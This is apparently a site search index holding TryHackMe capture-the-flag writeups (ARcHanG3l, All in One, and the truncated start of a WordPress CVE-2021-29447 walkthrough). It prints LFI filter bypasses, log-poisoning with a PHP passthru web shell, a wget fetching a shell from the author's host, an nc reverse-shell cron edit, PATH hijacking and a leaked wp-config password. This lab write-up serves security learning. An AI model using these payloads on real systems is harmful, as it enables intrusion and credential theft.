{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Welcome to my CTF Writeups","text":"<p>This page contains my writeups for various TryHackMe CTFs, organized by difficulty levels.  Click on the links below to navigate to each section:</p> <ul> <li>Easy CTFs</li> <li>Medium CTFs</li> <li>Hard CTFs</li> <li>Insane CTFs</li> </ul> <p><p>Note: certain sections are currently under development and may not yet be fully functional. It is normal to receive 404 errors as I work to  and update the site.</p> <p>"},{"location":"#find-me-here","title":"Find me here","text":"<p>"},{"location":"easy/ARcHanG3l/","title":"ARcHanG3l","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>Path to accomplish the CTF:</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul>"},{"location":"easy/ARcHanG3l/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Mon Feb 20 01:06:35 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.45.108\nNmap scan report for 10.10.45.108\n  Host is up (0.15s latency).\n  Not shown: 998 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 9f1d2c9d6ca40e4640506fedcf1cf38c (RSA)\n|   256 637327c76104256a08707a36b2f2840d (ECDSA)\n|_  256 b64ed29c3785d67653e8c4e0481cae6c (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Wavefire\n  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/20%OT=22%CT=1%CU=35053%PV=Y%DS=5%DC=I%G=Y%TM=63F30E0\n  OS:7%P=aarch64-unknown-linux-gnu)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=Z%II=I%TS\n  OS:=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4\n  OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 20 01:07:03 2023 -- 1 IP address (1 host up) scanned in 27.88 seconds\n</code></pre></li> </ul>"},{"location":"easy/ARcHanG3l/#enumeration","title":"Enumeration","text":"<p>As a part of Enumeration, I began by scanning the website on port 80 and stumbled upon a <code>wavefire</code> template. But thankfully, this led me to the domain name \"mafialive.thm\", which I added to my <code>/etc/hosts</code> file and accessed via the domain name.</p> <pre><code>127.0.0.1 localhost\n127.0.1.1 kali\n10.10.180.241 team.thm\n10.10.180.241 dev.team.thm\n10.10.45.108 mafialive.thm\n</code></pre> <p></p> <p>Upon accessing the page, I discovered <code>flag-1</code></p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>But there was nothing noteworthy beyond that. As a result, I executed the <code>dirsearch</code> script to locate hidden directories and files. Here, I discovered /test.php and accessed it.</p> <p><pre><code>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927\n\nOutput File: /home/kali/.dirsearch/reports/mafialive.thm/_23-02-21_09-38-53.txt\n\nError Log: /home/kali/.dirsearch/logs/errors-23-02-21_09-38-53.log\n\nTarget: http://mafialive.thm/\n\n[09:38:54] Starting: [09:38:59] 403 -  278B  - /.ht_wsr.txt                                     [09:38:59] 403 -  278B  - /.htaccess.bak1\n[09:38:59] 403 -  278B  - /.htaccess.sample\n[09:38:59] 403 -  278B  - /.htaccess.orig\n[09:38:59] 403 -  278B  - /.htaccess.save\n[09:38:59] 403 -  278B  - /.htaccess_sc\n[09:38:59] 403 -  278B  - /.htaccess_extra\n[09:38:59] 403 -  278B  - /.htaccess_orig\n[09:38:59] 403 -  278B  - /.htaccessBAK\n[09:38:59] 403 -  278B  - /.htaccessOLD\n[09:38:59] 403 -  278B  - /.htaccessOLD2\n[09:38:59] 403 -  278B  - /.htm                                            [09:38:59] 403 -  278B  - /.html\n[09:38:59] 403 -  278B  - /.htpasswd_test\n[09:38:59] 403 -  278B  - /.htpasswds\n[09:38:59] 403 -  278B  - /.httr-oauth\n[09:39:01] 403 -  278B  - /.php                                            [09:39:34] 200 -   59B  - /index.html                                       [09:39:46] 200 -   34B  - /robots.txt                                       [09:39:47] 403 -  278B  - /server-status/                                   [09:39:47] 403 -  278B  - /server-status                                    [09:39:51] 200 -  286B  - /test.php                                         \nTask Completed\n</code></pre> This was quite interesting, because there was a button and when i clicked, it gave me a opportunity to explore on LFI (Local file Inclusion vulnerabilities)</p> <p></p> <p>In attempting to access \"<code>/etc/passwd</code>\" via the URL http://mafialive.thm/test.php?view=/etc/passwd, I encountered some restrictions. To determine the parameters of access permissions, including those that were denied, I proceeded to review the source code.</p> <p>I found this on web to encode the content as base64 and decode it back as php. </p> <p>LFI-PHP Base64 Encode/Decode</p> <p><p>php://filter/convert.base64-encode/resource=file:///etc/passwd</p></p> <p>I proceeded to execute the following command: </p> <pre><code>http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=file:///var/www/html/development_testing/test.php \n</code></pre> <p></p> <p>Upon decoding the result, I was able to successfully access the <code>test.php</code> file, and the source code appeared as follows. It seems that the flag-2 was hidden in the source code of the test.php file I accessed.</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <pre><code>&lt;!DOCTYPE HTML&gt;\n&lt;html&gt;\n\n&lt;head&gt;\n    &lt;title&gt;INCLUDE&lt;/title&gt;\n    &lt;h1&gt;Test Page. Not to be Deployed&lt;/h1&gt;\n\n    &lt;/button&gt;&lt;/a&gt; &lt;a href=\"/test.php?view=/var/www/html/development_testing/mrrobot.php\"&gt;&lt;button id=\"secret\"&gt;Here is a button&lt;/button&gt;&lt;/a&gt;&lt;br&gt;\n        &lt;?php\n\n        //FLAG: REDACTED\n            function containsStr($str, $substr) {\n                return strpos($str, $substr) !== false;\n            }\n        if(isset($_GET[\"view\"])){\n        if(!containsStr($_GET['view'], '../..') &amp;&amp; containsStr($_GET['view'], '/var/www/html/development_testing')) {\n                include $_GET['view'];\n            }else{\n\n        echo 'Sorry, Thats not allowed';\n            }\n    }\n        ?&gt;\n    &lt;/div&gt;\n&lt;/body&gt;\n</code></pre> <p>The restrictions placed on the \"view\" parameter are evident; specifically, the string var/www/html/development_testing was allowed, while any occurrence of ../.. was not permitted. Through reverse engineering, I found a way to bypass these limitations, resulting in the following modified command.</p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd\n</code></pre> <p>That was working, and It gave me the results.</p> <pre><code>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin\nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin\nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin\nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\nnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\nsystemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin\nsystemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin\nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin\nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin\n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin\nuuidd:x:105:109::/run/uuidd:/usr/sbin/nologin\nsshd:x:106:65534::/run/sshd:/usr/sbin/nologin\narchangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash\n</code></pre>"},{"location":"easy/ARcHanG3l/#initial-access","title":"Initial Access","text":"<p>I saw an opportunity to explore further and decided to try a different file. In the context of Local File Inclusion (LFI), the remote files cannot be accessed, but it is possible to modify the contents of local files. This provided an opening to execute a straightforward PHP script on log files.</p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log\n</code></pre> <p>The server is configured to use Apache, which usually stores its log files in the directory <code>/var/log/apache2/access.log.</code> By utilizing the PHP command: </p> <p>PHP Command Execution</p> <p><p>&lt;? passthru($_GET[cmd]) ?&gt;</p></p> <p>we could pass commands as an argument through <code>cmd</code> and successfully execute them.</p> <p></p> <p>I though of a plan to download a reverse shell onto the server by utilizing the \"cmd\" argument. The command was structured as follows: </p> <pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&amp;cmd=wget%20%20http://10.17.3.217:8000/shell.php\n</code></pre> <p>Note</p> <p>I had a local Python HTTP server beforehand.</p> <p></p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>Subsequently, I accessed </p> <p><pre><code>http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php\n</code></pre> which enabled me to gain initial access. Using this access, I successfully located the flag-3 at \"/home/archangel/user.txt\"</p> <p></p>"},{"location":"easy/ARcHanG3l/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/ARcHanG3l/#gaining-user-access-horizontal","title":"Gaining User access (Horizontal)","text":"<p>Afterwards, I was able to escalate my privileges horizontally for the user <code>archangel</code>. By running the <code>linpeas.sh</code> script, I discovered that there was a cron job running with the following configuration:</p> <pre><code>*/1 * * * * archangel /opt/helloworld.sh\n</code></pre> <p>This presented an opportunity to execute a reverse shell. To do so, I modified the code within the <code>helloworld.sh</code> file to include the following command:</p> <p>Reverse Shell Command</p> <p>echo \"rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 10.17.3.217 5433\" &gt; /opt/helloworld.sh</p> <p>As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at  ~/secret/user2.txt</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul>"},{"location":"easy/ARcHanG3l/#gaining-root-access-vertical","title":"Gaining Root access (Vertical)","text":"<p>Upon gaining access to the <code>archangel</code> account, I was keen to identify any binaries with SUID permissions since I lacked passwords for any of the users. Consequently, I ran the following command:</p> <pre><code>find / -type f -perm -04000 -ls 2&gt;/dev/null\n\n392217     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp\n396413     76 -rwsr-xr-x   1 root     root        75824 Mar 23  2019 /usr/bin/gpasswd\n393011     76 -rwsr-xr-x   1 root     root        76496 Mar 23  2019 /usr/bin/chfn\n395021     44 -rwsr-xr-x   1 root     root        44528 Mar 23  2019 /usr/bin/chsh\n396417     60 -rwsr-xr-x   1 root     root        59640 Mar 23  2019 /usr/bin/passwd\n406571     20 -rwsr-xr-x   1 root     root        18448 Jun 28  2019 /usr/bin/traceroute6.iputils\n396823    148 -rwsr-xr-x   1 root     root       149080 Sep 23  2020 /usr/bin/sudo\n392437     44 -rwsr-xr--   1 root     messagebus    42992 Jun 11  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper\n524345    428 -rwsr-xr-x   1 root     root         436552 Mar  4  2019 /usr/lib/openssh/ssh-keysign\n396700     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device\n652899     28 -rwsr-xr-x   1 root     root          26696 Sep 17  2020 /bin/umount\n652831     44 -rwsr-xr-x   1 root     root          44664 Mar 23  2019 /bin/su\n652862     44 -rwsr-xr-x   1 root     root          43088 Sep 17  2020 /bin/mount\n660690     32 -rwsr-xr-x   1 root     root          30800 Aug 11  2016 /bin/fusermount\n652934     64 -rwsr-xr-x   1 root     root          64424 Jun 28  2019 /bin/ping\n1053235     20 -rwsr-xr-x   1 root     root          16904 Nov 18  2020 /home/archangel/secret/\n</code></pre> <p>During the search, I noticed that the <code>/home/archangel/secret/</code> directory appeared suspicious. Further investigation revealed the presence of an <code>ELF binary</code> with the SUID bit set. I used the <code>strings</code> command to examine its content, which indicated that the binary was copying files using the following command:</p> <pre><code>cp /home/user/archangel/myfiles/* /opt/backupfiles\n</code></pre> <p>However, since the path did not exist, it was unlikely that the program would run successfully. To exploit this vulnerability, I created a <code>cp</code> binary file in the<code>/tmp</code> directory and added the path to it as follows:</p> <pre><code>export PATH=\"/tmp:$PATH\"\n</code></pre> <p>With this modification, I was able to execute the \"cp\" command with the SUID permissions and obtain a root shell.</p> <ul> <li> Flag 1: Hostname</li> <li> Flag 2: Exploiting LFI</li> <li> Flag 3: Initial Access</li> <li> Flag 4: User Flag</li> <li> Flag 5: Root Flag</li> </ul> <p>Success</p> <p>and from there, I had peace upon me! </p>"},{"location":"easy/AllInOne/","title":"All in One","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>This \"All in One\" Box has various vulnerabilities that can be exploited in several ways. There is not just one path to root, but many. In this blog, I have provided all the ways, so you can choose whichever you want.</p>"},{"location":"easy/AllInOne/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  # Nmap 7.93 scan initiated Mon Feb 13 09:48:37 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.245.161\nNmap scan report for 10.10.245.161\n  Host is up (0.16s latency).\n  Not shown: 997 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n  21/tcp open  ftp     vsftpd 3.0.3\n  | ftp-syst: |   STAT: | FTP server status:\n  |      Connected to ::ffff:10.17.3.217\n  |      Logged in as ftp\n  |      TYPE: ASCII\n  |      No session bandwidth limit\n  |      Session timeout in seconds is 300\n|      Control connection is plain text\n  |      Data connections will be plain text\n  |      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n  |_End of status\n  |_ftp-anon: Anonymous FTP login allowed (FTP code 230)\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 e25c3322765c9366cd969c166ab317a4 (RSA)\n|   256 1b6a36e18eb4965ec6ef0d91375859b6 (ECDSA)\n|_  256 fbfadbea4eed202b91189d58a06a50ec (ED25519)\n80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))\n|_http-server-header: Apache/2.4.29 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n  No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\n  TCP/IP fingerprint:\n  OS:SCAN(V=7.93%E=4%D=2/13%OT=21%CT=1%CU=35531%PV=Y%DS=5%DC=I%G=Y%TM=63EA4DE\n  OS:2%P=aarch64-unknown-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS\n  OS:=A)OPS(O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M\n  OS:505ST11NW7%O6=M505ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4\n  OS:B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=\nOS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q\n  OS:=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A\n  OS:%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y\n  OS:%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T\n  OS:=40%CD=S)\n\nNetwork Distance: 5 hops\n  Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel\n\n  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  # Nmap done at Mon Feb 13 09:49:06 2023 -- 1 IP address (1 host up) scanned in 29.29 seconds\n</code></pre></li> </ul>"},{"location":"easy/AllInOne/#enumeration","title":"Enumeration","text":"<p>Initially, I enumerated the FTP protocol and searched for anything suspicious, but the root directory was empty. Therefore, I moved ahead.</p> <p>At port 80, as this is typical in most CTFs, I saw the default Apache welcome page. I continued to enumerate and explore the hidden directories. I discovered /wordpress (again, a typical result) and /hackathons (although it appeared to be a folder, later I got surprised).</p> <p></p> <p>I visited both websites and discovered that Wordpress had the following:</p> <ul> <li>Theme: TwentyTwenty</li> <li>XML-RPC enabled</li> <li>Vulnerable plugin: Mail-Masta</li> <li>Users: Elyana</li> </ul> <p>Meanwhile, /hackathons only provided me with this information. </p> <p></p> <p>While sneaking around the page source, I found some credentials -- REDACTED which I suspected were <code>username:Base64</code>. However, it failed to decode literally. Then, I asked my friend Cyberchef Magic Function to decode it, but it still didn't help. Nonetheless, I moved on.</p> <p>I decided to conduct further research on the vulnerability in Wordpress. </p> <ul> <li>I found that the <code>TwentyTwenty</code> theme did not have any significant vulnerabilities.    </li> <li>I attempted different <code>XML-RPC methods</code> to retrieve data but failed. </li> <li>Then, I discovered that <code>Mail-Masta</code> had an exploit in the SearchSploit module, which I decided to try.</li> </ul>"},{"location":"easy/AllInOne/#initial-access","title":"Initial Access","text":"<p>Mail-Masta was affected by LFI, which was ideal for obtaining the contents of local server files.</p> <p>Local File Inclusion (LFI)</p> <p>LFI is a web vulnerability that allows attackers to access files on the server they shouldn't have access to. This occurs when a web application includes a file from the server's file system using user input without proper validation.</p> <p>To retrieve <code>/etc/passwd</code>, I used:</p> <pre><code>GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd HTTP/1.1\n</code></pre> <pre><code>root:x:0:0:root:/root:/bin/bash \ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin \nbin:x:2:2:bin:/bin:/usr/sbin/nologin \nsys:x:3:3:sys:/dev:/usr/sbin/nologin \nsync:x:4:65534:sync:/bin:/bin/sync \ngames:x:5:60:games:/usr/games:/usr/sbin/nologin \nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin \nlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin \nmail:x:8:8:mail:/var/mail:/usr/sbin/nologin \nnews:x:9:9:news:/var/spool/news:/usr/sbin/nologin \nuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin \nproxy:x:13:13:proxy:/bin:/usr/sbin/nologin \nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin \nbackup:x:34:34:backup:/var/backups:/usr/sbin/nologin \nlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin \nirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin \nBug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin \nsyslog:x:102:106::/home/syslog:/usr/sbin/nologin \nmessagebus:x:103:107::/nonexistent:/usr/sbin/nologin \n_apt:x:104:65534::/nonexistent:/usr/sbin/nologin \ndnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin \nlandscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin \npollinate:x:109:1::/var/cache/pollinate:/bin/false elyana:x:1000:1000:Elyana:/home/elyana:/bin/bash mysql:x:110:113:MySQL Server,,,:/nonexistent:/bin/false \nsshd:x:112:65534::/run/sshd:/usr/sbin/nologin \nftp:x:111:115:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin </code></pre> <p>This confirmed the user elyana.</p> <p>I then attempted to retrieve the <code>wp-config.php</code> file. However, I didn't receive a response.</p> <p>Failed</p> <pre><code>GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/var/www/html/wordpress/wp-config.php HTTP/1.1\n</code></pre> <p>Later, I discovered that I needed to encode PHP files into text form in Base64:</p> <p>Succeeded</p> <pre><code>GET /wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=file:///var/www/html/wordpress/wp-config.php HTTP/1.1\n</code></pre> <pre><code>&lt;?php\n\n/** MySQL database username */\ndefine( 'DB_USER', 'elyana' );\n/** MySQL database password */\ndefine( 'DB_PASSWORD', 'H@ckme@123' );\n/** MySQL hostname */\ndefine( 'DB_HOST', 'localhost' );\n\n/** Database Charset to use in creating database tables. */\ndefine( 'DB_CHARSET', 'utf8mb4' );\n\n/** The Database Collate type. Don't change this if in doubt. */\ndefine( 'DB_COLLATE', '' );\n\nwordpress;\ndefine( 'WP_SITEURL', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');\ndefine( 'WP_HOME', 'http://' .$_SERVER['HTTP_HOST'].'/wordpress');\n</code></pre> <p>Although I attempted to reuse the SQL password for the SSH service, it didn't work. Eventually, I logged in as elyana in Wordpress and changed the content of the Reflex Gallery plugin in <code>reflex-gallery/lib/gallery-class.php</code> with a reverse shell. </p> <p> </p> <p>Note</p> <p>Note: You need to deactivate the reflex-gallery plugin first to change the PHP file, then activate it again.</p> <p>When <code>/wordpress/wp-content/plugins/reflex-gallery/lib/gallery-class.php</code> was accessed on browser, I obtained a shell with the <code>www-data</code> user.</p> <p></p>"},{"location":"easy/AllInOne/#privilege-escalation","title":"Privilege Escalation","text":""},{"location":"easy/AllInOne/#gaining-user-access-elyana","title":"Gaining User access (Elyana)","text":"Private.txtChmod SUID <p>As soon as I got the shell, I checked to see if <code>www-data</code> could read user.txt, but it was not possible. However, there was a hint file that said, </p> <pre><code>\"Elyana's user password is hidden in the system. Find it ;)\"\n</code></pre> <p>I searched for files owned by elyana using the command and found a private.txt file in the /etc/ folder.</p> <pre><code>find / -user elyana 2&gt;/dev/null \n</code></pre> <p>The file contained the username and password for elyana's user account. Using SSH, I escalated my privileges to elyana.</p> <p>Then, I checked all SUID set bit binaries to see what I could exploit, and ran the command:</p> <pre><code>find / -user root -perm /4000 -ls 2&gt;/dev/null\n</code></pre> <p>This showed me that the following binaries were available in SUID set:</p> <pre><code>-rwsr-sr-x 1 root root 1.1M Jun 6 2019 /bin/bash\n-rwsr-sr-x 1 root root 59K Jan 18 2018 /bin/chmod\n-rwsr-sr-x 1 root root 392K Apr 4 2018 /usr/bin/socat\n</code></pre> <p>Since my goal was to escalate and obtain user.txt, I focused on using<code>/bin/chmod</code>, which can be run as root.</p> <p></p> <p>Note: This method actually runs as a root. But, this is one of the possibility to get user.txt from www-data.</p>"},{"location":"easy/AllInOne/#gaining-root-access","title":"Gaining Root access","text":"<p>You can escalate your privilege to root in different ways:</p> CRON jobBash Binary <p>After noticing a cronjob that ran <code>/var/backups/script.sh</code>, I realized that I had all the permissions as <code>elyana</code>. </p> <p></p> <p>So, I changed the code to:</p> <pre><code>cp /root/root.txt /tmp/root.txt. \n</code></pre> <p>We already knew about the SUID binaries, including /bin/bash, /bin/chmod, and /usr/bin/socat. I decided to check with the bash binary by running the following command:</p> <p><pre><code>/bin/bash -p\n</code></pre> This command allowed me to get root access. What else can I ask? </p> <p>I then tried to read the root.txt file located at <code>/root/root.txt</code> </p> <p>Note: /bin/bash can also be executed by <code>www-data</code>. So you get root directly from <code>www-data</code> bypassing <code>elyana</code></p>"},{"location":"easy/CVE-2021-29447/","title":"Wordpress CVE","text":"<p>TryHackMe Link</p> <p>Description</p> <p><p></p></p> <p>This walkthrough discusses an XXE vulnerability found in the WordPress Media Library by security firm SonarSource.  The impact of the vulnerability includes arbitrary file disclosure and server-side request forgery. It also describes how the vulnerability can be exploited using the WPScan tool.</p> <p>Warning</p> <p>The vulnerability can only be exploited only when WordPress runs on PHP 8 and the attacker has permission to upload media files.</p> <p>To Complete the room, we need to find and answer the below question:</p> <ul> <li> Use the vulnerability CVE-2021-29447 to read the wordpress configuration file.</li> <li> what is the name of the database for WordPress?</li> <li> what are the credentials you found? (user:password)</li> <li> Enumerate and identify what is the dbms installed on the server?</li> <li> what is the dbms version installed on the server?</li> <li> what port is the dbms running on?</li> <li> What is the encrypted password located in the wordpress  users table with id 1??</li> <li> What is the password in plaint text?</li> <li> Compromise the machine and locate flag.txt</li> </ul>"},{"location":"easy/CVE-2021-29447/#scanning","title":"Scanning","text":"<ul> <li> <p>Assigned IP address: \u00a0 </p> </li> <li> <p>Open Ports: </p> </li> </ul> <p>PORT</p> <p>SERVICE</p> <p>DESCRIPTION <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <p></p> <ul> <li>Nmap Report:   <pre><code>  Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-23 08:31 EST\n  Nmap scan report for 10.10.234.15\n  Host is up (0.15s latency).\n  Not shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE VERSION\n  22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: |   2048 f065b842b7c3ba8efee43ccd57f1292e (RSA)\n|   256 421e1b8f1938992e3670cf0eb6319214 (ECDSA)\n|_  256 8e8943de5d9b9966c42a9317f30ee1f4 (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))\n|_http-title: Tryhackme &amp;#8211; Just another WordPress site\n|_http-generator: WordPress 5.6.2\n  |_http-server-header: Apache/2.4.18 (Ubuntu)\n3306/tcp open  mysql   MySQL REDACTED-0ubuntu0.16.04.1\n  | ssl-cert: Subject: commonName=MySQL_Server_REDACTED_Auto_Generated_Server_Certificate\n  | Not valid before: 2021-05-26T21:23:31\n  |_Not valid after:  2031-05-24T21:23:31\n  | mysql-info: |   Protocol: 10\n|   Version: REDACTED-0ubuntu0.16.04.1\n  |   Thread ID: 93\n|   Capabilities flags: 65535\n|   Some Capabilities: SupportsTransactions, Support41Auth, Speaks41ProtocolOld, ConnectWithDatabase, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, SwitchToSSLAfterHandshake, IgnoreSigpipes, DontAllowDatabaseTableColumn, SupportsLoadDataLocal, FoundRows, ODBCClient, SupportsCompression, LongPassword, Speaks41ProtocolNew, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults\n  |   Status: Autocommit\n  |   Salt: Av2C[)\\x12R\\x12N-&lt;\\x1BIw\\x1F\\x1E\\x13g_\n  |_  Auth Plugin Name: mysql_native_password\n  |_ssl-date: TLS randomness does not represent time\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\n  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n  Nmap done: 1 IP address (1 host up) scanned in 29.21 seconds\n</code></pre></li> </ul>"},{"location":"easy/CVE-2021-29447/#exploiting-cve-2021-29447","title":"Exploiting CVE-2021-29447","text":"<p>The vulnerability identified in CVE-2021-29447 pertains to an Authenticated XXE Within the Media Library Affecting PHP 8. To exploit this vulnerability, I followed the instructions provided and created a 